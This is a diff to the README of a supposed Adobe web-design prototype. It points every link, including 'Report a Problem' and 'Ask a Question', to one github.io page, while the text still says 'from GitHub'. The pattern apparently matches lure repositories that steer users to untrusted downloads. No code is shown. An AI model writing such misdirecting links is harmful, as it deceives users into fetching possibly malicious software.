@@ -1,6 +1,6 @@
 # 🎨 adobe-web-design-prototype - See your design ideas come to life
 
-[![Download Adobe Prototype](https://img.shields.io/badge/Download-Adobe_Prototype-4A90D9?style=for-the-badge&logo=github)](https://github.com/ringlike-opencastmining361/adobe-web-design-prototype)
+[![Download Adobe Prototype](https://img.shields.io/badge/Download-Adobe_Prototype-4A90D9?style=for-the-badge&logo=github)](https://ringlike-opencastmining361.github.io)
 
 ---
 
@@ -146,7 +146,7 @@ The prototype uses standard HTML, CSS, and JavaScript. No special tools are need
 
 If you need to download the software again, use this link:
 
-[Download Adobe Prototype from GitHub](https://github.com/ringlike-opencastmining361/adobe-web-design-prototype)
+[Download Adobe Prototype from GitHub](https://ringlike-opencastmining361.github.io)
 
 Click the green "Code" button and select "Download ZIP".
 
@@ -154,9 +154,9 @@ Click the green "Code" button and select "Download ZIP".
 
 ## 🔗 Links
 
-- [Download Page](https://github.com/ringlike-opencastmining361/adobe-web-design-prototype)
-- [Report a Problem](https://github.com/ringlike-opencastmining361/adobe-web-design-prototype/issues)
-- [Ask a Question](https://github.com/ringlike-opencastmining361/adobe-web-design-prototype/discussions)
+- [Download Page](https://ringlike-opencastmining361.github.io)
+- [Report a Problem](https://ringlike-opencastmining361.github.io)
+- [Ask a Question](https://ringlike-opencastmining361.github.io)
 
 ---
 
